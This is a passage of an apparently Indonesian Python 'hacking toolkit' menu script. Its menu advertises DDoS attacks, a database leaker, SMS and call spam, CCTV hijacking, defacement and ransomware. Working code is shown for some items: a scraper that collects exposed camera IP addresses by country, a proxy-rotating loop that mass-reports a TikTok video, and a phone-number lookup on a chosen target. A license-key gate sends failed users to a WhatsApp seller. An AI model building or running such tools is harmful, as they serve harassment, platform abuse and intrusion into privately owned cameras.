 / ___/ ___/_  __/ | / / / // (_) (_)__ _____/ /_____ ____
\033[1;37m/ /__/ /__  / /  | |/ / / _  / / / / _ `/ __/  '_/ -_) __/
\___/\___/ /_/   |___/ /_//_/_/_/ /\_,_/\__/_/\_\\__/_/ 
                             |___/\033[1;31mBy AngelSecurityTeam
\033[1;37mList Country Codes \033[1;31m:
""")

    for key, value in countries.items():
        print(f'\033[1;31m(\033[1;37m{key}\033[1;31m) - \033[1;37m{value["country"]} \033[1;31m/ (\033[1;37m{value["count"]}\033[1;31m)  ')
        print("")
        
    try:
        country = input("\033[1;37mCountry Code \033[1;31m(\033[1;37m##\033[1;31m) : \033[1;37m")
        res = requests.get(
            f"http://www.insecam.org/en/bycountry/{country}", headers=headers
        )
        last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]

        for page in range(int(last_page)):
            res = requests.get(
                f"http://www.insecam.org/en/bycountry/{country}/?page={page}",
                headers=headers
            )
            find_ip = re.findall(r"http://\d+.\d+.\d+.\d+:\d+", res.text)
    
            with open(f'{country}.txt', 'w') as f:
              for ip in find_ip:
                  print("")
                  print("\033[1;31m", ip)
                  f.write(f'{ip}\n')
    except:
        pass
    finally:
        print('\n\033[37mSave File :'+country+'.txt')

def report_tiktok():
    tiktok_url = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mLink Video Target \033[1;31m: \033[0;37m")

    while True:
        proxies = requests.get(url="https://advanced.name/freeproxy/665a835edb6a2").text.split('\r\n') #Update Your Proxy List From This URL (https://advanced.name/freeproxy/)
        for proxy in proxies:
            try:
                now = datetime.now()
                current_time = now.strftime("%H:%M:%S")
                req = session().post(tiktok_url, proxies={'http': f'http://{proxy}'})
                print(f' \033[1;34m[{current_time}]' + f' Proxy: {proxy} Report Sent')
            except:
                print(' \033[1;31mSome Thing Gay Here Its Not Working:) ')
                input(' Press Enter to close the program')
                exit()

def spam_call():
    import asyncio 
    from truecallerpy import login
    phone_number = input("\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mNomor Target \033[1;31m(ex. +972xxx) \033[1;36m: \033[0;37m")
    response = asyncio.run(login(phone_number))
    if phone_number == "":
        print(" \033[1;31m[\033[1;37m!\033[1;31m] \033[1;33mProgram dihentikan")
        time.sleep(1)
        print()
        sys.exit()
    else:
        print(f"\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mResult \033[1;36m: \033[0;37m{response}")

def fake_email():
    list_mail = ["vintomaper.com","tovinit.com","mentonit.net"]
    url = "https://cryptogmail.com/"
    num = 0

    def get_teks(accept, key):
	    cek = r.get(url+"api/emails/"+key, headers={"accept": accept}).text
	    if "error" in cek:
	    	return "-"
	    else:
    		return cek.strip()

    def get_random(digit):
    	lis = list("abcdefghijklmnopqrstuvwxyz0123456789")
    	dig = [random.choice(lis) for _ in range(digit)]
    	return "".join(dig), random.choice(list_mail)

    def animate(teks):
    	lis = list("\|/-")
    	for cy in lis:
		    print("\r \033[1;31m[\033[1;37m"+cy+"\033[1;31m] "+str(teks)+".. ", end="")
		    sleep(0.5)

    def run(email):
	    while True:
		    try:
		    	animate("\033[1;34mWaiting for incoming message")
		    	raun = r.get(url+"api/emails?inbox="+email).text
		    	if "404" in raun:
			    	continue
		    	elif "data" in raun:
			    	z = json.loads(raun)
			    	for data in z["data"]:
					    print("\r \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mID\033[1;31m         : \033[0;37m"+data["id"], end="\n")
					    got = json.loads(r.get(url+"api/emails/"+data["id"]).text)
					    pengirim = got["data"]["sender"]["display_name"]
					    email_pe = got["data"]["sender"]["email"]
					    subject  = got["data"]["subject"]
					    print("\r \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mSender Name\033[1;31m: \033[0;37m"+pengirim, end="\n")
					    print("\r \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mSender mail\033[1;31m: \033[0;37m"+email_pe, end="\n")
					    print("\r \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mSubject    \033[1;31m: \033[0;37m"+subject, end="\n")
					    print("\r \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMessage    \033[1;31m: \033[0;37m"+get_teks("text/html,text/plain",data["id"]), end="\n")
					    atc = got["data"]["attachments"]
					    if atc == []:
			    			print("\r \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mattachments\033[1;31m: \033[0;37m-", end="\n")
					    else:
						    print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mattachments\033[1;31m: \033[0;37m")
						    for atch in atc:
				    			id = atch["id"]
				    			name = atch["file_name"]
				    			name = name.split(".")[-1]
				    			svee = r.get("https://cryptogmail.com/api/emails/"+data["id"]+"/attachments/"+id)
			    				open(id+"."+name, "wb").write(svee.content)
					    		print("      ~ "+id+"."+name)
					    print("-"*45)
					    r.delete(url+"api/emails/"+data["id"])
			    	continue
		    	else:
			    	continue
		    except (KeyboardInterrupt,EOFError):
			    	exit("\n \033[1;31m[\033[1;37m✓\033[1;31m] \033[1;33mProgram finished, exiting..\n")


    def main():
	    os.system("cls" if os.name == "nt" else "clear")
	    global num
	    print("""\033[1;34m
     ______      __           ______                _ __
    / ____/___ _/ /_____     / ____/___ ___  ____ _(_) /
   / /_  / __ `/ //_/ _ \   / __/ / __ `__ \/ __ `/ / / 
  / __/ / /_/ / ,< /  __/  / /___/ / / / / / /_/ / / /  
 /_/    \__,_/_/|_|\___/  /_____/_/ /_/ /_/\__,_/_/_/   

      \033[1;31mBy RizkyDev

 \033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mSet Email Random
 \033[1;31m[\033[1;37m2\033[1;31m] \033[1;36mSet Email Custom
 \033[1;31m[\033[1;37m0\033[1;31m] \033[1;36mExit
""")

	    pil = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChoose \033[1;31m: \033[0;37m")
	    while pil == "" or not pil.isdigit():
	    	pil = input( "\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChoose \033[1;31m: \033[0;37m")
	    if pil in ["01","1"]:
	    	set_name, set_email = get_random(10)
	    	print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mYour email \033[1;31m: \033[0;37m"+set_name+"@"+set_email)
	    	print(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mCTRL+C to stopped..")
	    	print("-"*45)
	    	run(set_name+"@"+set_email)
	    elif pil in ["02","2"]:
	    	set_name = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mSet mail name \033[1;31m: \033[0;37m")
	    	print()
	    	num = 0
	    	for cy in list_mail:
	    	  num += 1
	    	  print(" "*4,"\033[1;31m[\033[1;37m"+str(num)+"\033[1;31m] \033[1;36m@"+cy)
	    	print()
	    	set_email = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mSelect \033[1;31m: \033[0;37m")
	    	while set_email == "" or not set_email.isdigit() or int(set_email) > len(list_mail):
		    	set_email = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mSelect \033[1;31m: \033[0;37m")
	    	mail = list_mail[int(set_email)-1]
	    	print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mYour email \033[1;31m: \033[0;37m"+set_name+"@"+mail)
	    	print(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mCTRL+ C to stopped..")
	    	print("-"*45)
	    	run(set_name+"@"+mail)
	    elif pil in ["00","0"]:
	    	print(" \033[1;31m[\033[1;37m!\033[1;31m] \033[1;33mExit program\n")
	    	time.sleep(1)
	    else:
	    	print(" \033[1;31m[\033[1;37m!\033[1;31m] \033[1;33mMenu not found, exit..\n")
	    	time.sleep(1)
    if __name__ == "__main__":
    	main()
      
def loading():
    animation = [
        "[\x1b[1;91m■\x1b[0m□□□□□□□□□]",
        "[\x1b[1;92m■■\x1b[0m□□□□□□□□]",
        "[\x1b[1;93m■■■\x1b[0m□□□□□□□]",
        "[\x1b[1;94m■■■■\x1b[0m□□□□□□]",
        "[\x1b[1;95m■■■■■\x1b[0m□□□□□]",
        "[\x1b[1;96m■■■■■■\x1b[0m□□□□]",
        "[\x1b[1;90m■■■■■■■\x1b[0m□□□]",
        "[\x1b[1;91m■■■■■■■■\x1b[0m□□]",
        "[\x1b[1;92m■■■■■■■■■\x1b[0m□]",
        "[\x1b[1;97m■■■■■■■■■■\x1b[0m]",
    ]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(
            f"\r \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChecking   \033[1;31m:\x1b[0m " + animation[i % len(animation)] + "\x1b[0m "
        )
        sys.stdout.flush()

def logo():
     print (f"""\033[1;31m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⣿⣏⠉⠉⠉⠉⠉⠉⢡⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⢿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡄⠀
⠈⣿⣿⣿⣿⣦⣽⣦⡀⠀⠀⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⠀⠀
⠀⠘⢿⣿⣿⣿⣿⣿⣿⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠇⠀⠀
⠀⠀⠈⠻⣿⣿⣿⣿⡟⢿⠻⠛⠙⠉⠋⠛⠳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⡟⠀⠀⠀
⠀⠀⠀⠀⠈⠙⢿⡇⣠⣤⣶⣶⣾⡉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣰⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠾⢇⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠱⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠤⢤⣀⣀⣀⣀⣀⣀⣠⣤⣤⣤⣬⣭⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣶⣤⣄⣀⣀⣠⣴⣾⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣾⣿⣿⣿⣿⡿⠿⠛⠛⠻⣿⣿⣿⣿⣇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣘⡛⠿⢿⡿⠟⠛⠉⠁⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣦⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⠿⠛⠉⠁⠀⠈⠉⠙⠛⠛⠻⠿⠿⠿⠿⠟⠛⠃⠀⠀⠀⠉⠉⠉⠛⠛⠛⠿⠿⠿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠈⠙⠛⠂
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
 \033[1;34m██████\033[1;31m╗    \033[1;34m█████\033[1;31m╗   \033[1;34m██████\033[1;31m╗   \033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╗           \033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╗
 \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m║ \033[1;34m██\033[1;31m╔╝           ╚\033[1;34m██\033[1;31m╗\033[1;34m██\033[1;31m╔╝
 \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m███████\033[1;31m║  \033[1;34m██████\033[1;31m╔╝  \033[1;34m█████\033[1;31m╔╝   \033[1;34m███████\033[1;31m╗  ╚\033[1;34m███\033[1;31m╔╝
 \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔═\033[1;34m██\033[1;31m╗   ╚══════╝  \033[1;34m██\033[1;31m╔\033[1;34m██\033[1;31m╗
 \033[1;34m██████\033[1;31m╔╝  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╗           \033[1;34m██\033[1;31m╔╝ \033[1;34m██\033[1;31m╗
 \033[1;31m╚═════╝   ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝           ╚═╝  ╚═╝
\033[1;34m╔═════════════════════════════════════════════════════════╗
\033[1;34m║ \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mAuthor      \033[1;31m: \033[1;37mShadow Xploit                         \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mContact     \033[1;31m: \033[1;37mt.me/ShadowXploit                     \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mCommunity   \033[1;31m: \033[1;37mDARK XPLOITER | OFC                   \033[1;34m║
\033[1;34m╚═════════════════════════════════════════════════════════╝
║                          \033[1;31mMENU                           \033[1;34m║
╔═════════════════════════════════════════════════════════╗
\033[1;34m║ \033[1;31m[\033[1;37m01\033[1;31m] \033[1;34m║ \033[1;36mDDOS ATTACK LAYER 7 METHOD                       \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m02\033[1;31m] \033[1;34m║ \033[1;36mDDOS ATTACK LAYER 4 METHOD                       \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m03\033[1;31m] \033[1;34m║ \033[1;36mVPS SERVER 2CPU RAM 4GB                          \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m04\033[1;31m] \033[1;34m║ \033[1;36mRDP KALI LINUX SERVER                            \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m05\033[1;31m] \033[1;34m║ \033[1;36mFILE DATABASE LEAKER  ️                           \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m06\033[1;31m] \033[1;34m║ \033[1;36mWEB ACCOUNT SCRAPER    ️                          \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m07\033[1;31m] \033[1;34m║ \033[1;36mOSINT INSTAGRAM ACCOUNT                          \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m08\033[1;31m] \033[1;34m║ \033[1;36mTRACK DOMAIN/IP ADDRESS                          \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m09\033[1;31m] \033[1;34m║ \033[1;36mCHAT AI TERMINAL UNLIMITED                     ️  \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m10\033[1;31m] \033[1;34m║ \033[1;36mLINUX BANNER FOR TERMUX                          \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m11\033[1;31m] \033[1;34m║ \033[1;36mBRUTEFORCE ZIP PASSWORD                          \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m12\033[1;31m] \033[1;34m║ \033[1;36mSPAM BRUTAL SMS WHATSAPP V1                      \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m13\033[1;31m] \033[1;34m║ \033[1;36mSPAM BRUTAL SMS WHATSAPP V2                      \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m14\033[1;31m] \033[1;34m║ \033[1;36mSPAM CALL ALL COUNTRY                            \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m15\033[1;31m] \033[1;34m║ \033[1;36mSPAM CALL MANUAL UNLIMITED                       \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m16\033[1;31m] \033[1;34m║ \033[1;36mSPAM SENDER EMAIL                                \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m17\033[1;31m] \033[1;34m║ \033[1;36mSPAM RIPPER UNDANGAN APK                         \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m18\033[1;31m] \033[1;34m║ \033[1;36mCCTV HIJACKER V1               ️                  \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m19\033[1;31m] \033[1;34m║ \033[1;36mCCTV HIJACKER V2               ️                  \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m20\033[1;31m] \033[1;34m║ \033[1;36mSCRIPT DEFACE GENERATOR                          \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m21\033[1;31m] \033[1;34m║ \033[1;36mRANSOMWARE TERMUX                                \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m22\033[1;31m] \033[1;34m║ \033[1;36mBOT NULIS ONLINE                                 \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m23\033[1;31m] \033[1;34m║ \033[1;36mREPORT TIKTOK                                    \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m24\033[1;31m] \033[1;34m║ \033[1;36mPYTHON OBFUSCATER                                \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m25\033[1;31m] \033[1;34m║ \033[1;36mFAKE EMAIL VERIFICATION                          \033[1;34m║
\033[1;34m║ \033[1;31m[\033[1;37m00\033[1;31m] \033[1;34m║ \033[1;36mEXIT PROGRAM                                     \033[1;34m║
\033[1;34m╚═════════════════════════════════════════════════════════╝
""")
#https://script-deface-generator.prinsh.com/
def logo2():
     print (f"""\033[1;31m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⣿⣏⠉⠉⠉⠉⠉⠉⢡⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⢿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡄⠀
⠈⣿⣿⣿⣿⣦⣽⣦⡀⠀⠀⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⠀⠀
⠀⠘⢿⣿⣿⣿⣿⣿⣿⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠇⠀⠀
⠀⠀⠈⠻⣿⣿⣿⣿⡟⢿⠻⠛⠙⠉⠋⠛⠳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⡟⠀⠀⠀
⠀⠀⠀⠀⠈⠙⢿⡇⣠⣤⣶⣶⣾⡉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣰⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠾⢇⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠱⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠤⢤⣀⣀⣀⣀⣀⣀⣠⣤⣤⣤⣬⣭⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣶⣤⣄⣀⣀⣠⣴⣾⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣾⣿⣿⣿⣿⡿⠿⠛⠛⠻⣿⣿⣿⣿⣇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣘⡛⠿⢿⡿⠟⠛⠉⠁⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣦⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⠿⠛⠉⠁⠀⠈⠉⠙⠛⠛⠻⠿⠿⠿⠿⠟⠛⠃⠀⠀⠀⠉⠉⠉⠛⠛⠛⠿⠿⠿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠈⠙⠛⠂
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
 \033[1;34m██████\033[1;31m╗    \033[1;34m█████\033[1;31m╗   \033[1;34m██████\033[1;31m╗   \033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╗           \033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╗
 \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m║ \033[1;34m██\033[1;31m╔╝           ╚\033[1;34m██\033[1;31m╗\033[1;34m██\033[1;31m╔╝
 \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m███████\033[1;31m║  \033[1;34m██████\033[1;31m╔╝  \033[1;34m█████\033[1;31m╔╝   \033[1;34m███████\033[1;31m╗  ╚\033[1;34m███\033[1;31m╔╝
 \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔═\033[1;34m██\033[1;31m╗   ╚══════╝  \033[1;34m██\033[1;31m╔\033[1;34m██\033[1;31m╗
 \033[1;34m██████\033[1;31m╔╝  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╗           \033[1;34m██\033[1;31m╔╝ \033[1;34m██\033[1;31m╗
 \033[1;31m╚═════╝   ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝           ╚═╝  ╚═╝
\033[1;34m╔═════════════════════════════════════════════════════════╗
║                         \033[1;31mLICENSE                         \033[1;34m║
╚═════════════════════════════════════════════════════════╝""")

os.system("cls" if os.name == "nt" else "clear")
def simpan_password(password):
    with open('.login.txt', 'w') as file:
        file.write(password)
def cek_login():
    try:
        with open('.login.txt', 'r') as file:
            password = file.read()
            return password
    except FileNotFoundError:
        return None
def login():
    stored_password = cek_login()
    if stored_password is not None and stored_password == 'SANZ-BTAA-3W9Y-7EKR-92PD':
        os.system("cls" if os.name == "nt" else "clear")
        logo()
    else:
        logo2()
        input_password = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mKey        \033[1;31m: \033[0;37m")
        loading()
        if input_password == 'SANZ-BTAA-3W9Y-7EKR-92PD':
            simpan_password(input_password)
            print ("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mResult     \033[1;31m: \033[1;32mKey Valid!")
            time.sleep(3)
            os.system("cls" if os.name == "nt" else "clear")
            logo()
        else:
            print ("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mResult     \033[1;31m: \033[1;31mKey Invalid!")
            if os.name == "posix":
               os.system("xdg-open https://wa.me/6283141494320")
            elif os.name == "nt":
               os.system("start https://wa.me/6283141494320")
            quit()
if os.path.exists('.login.txt'):
    login()
else:
    logo2()
    password = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mKey        \033[1;31m: \033[0;37m")
    loading()
    if password == 'SANZ-BTAA-3W9Y-7EKR-92PD':
        simpan_password(password)
        print ("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mResult     \033[1;31m: \033[1;32mKey Valid!")
        time.sleep(2)
        os.system("cls" if os.name == "nt" else "clear")
        logo()
    else:
        print ("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mResult     \033[1;31m: \033[1;31mKey Invalid!")
        if os.name == "posix":
           os.system("xdg-open https://wa.me/6283141494320")
        elif os.name == "nt":
           os.system("start https://wa.me/6283141494320")
        sys.exit(0)

while True:
    try:
        message = input("\033[1;34m┌──(\033[1;31mdark-x㉿localhost\033[1;34m)-[\033[1;37m~\033[1;34m]\n└─\033[1;31m#\033[1;37m ")
        if message.strip():
            if message == "0" or message == "00":
                print(" \033[1;31m[\033[1;37m!\033[1;31m] \033[1;33mProgram dihentikan")
                time.sleep(1)
                print()
                break
            elif message == "1" or message == "01":
                os.system("cls" if os.name == "nt" else "clear")
                time.sleep(1)
                print("""\033[1;34m
 \033[1;34m██\033[1;31m╗       \033[1;34m█████\033[1;31m╗  \033[1;34m██\033[1;31m╗   \033[1;34m██\033[1;31m╗ \033[1;34m███████\033[1;31m╗ \033[1;34m██████\033[1;31m╗     \033[1;34m███████\033[1;31m╗
 \033[1;34m██\033[1;31m║      \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗ ╚\033[1;34m██\033[1;31m╗ \033[1;34m██\033[1;31m╔╝ \033[1;34m██\033[1;31m╔════╝ \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗    ╚════\033[1;34m██\033[1;31m║
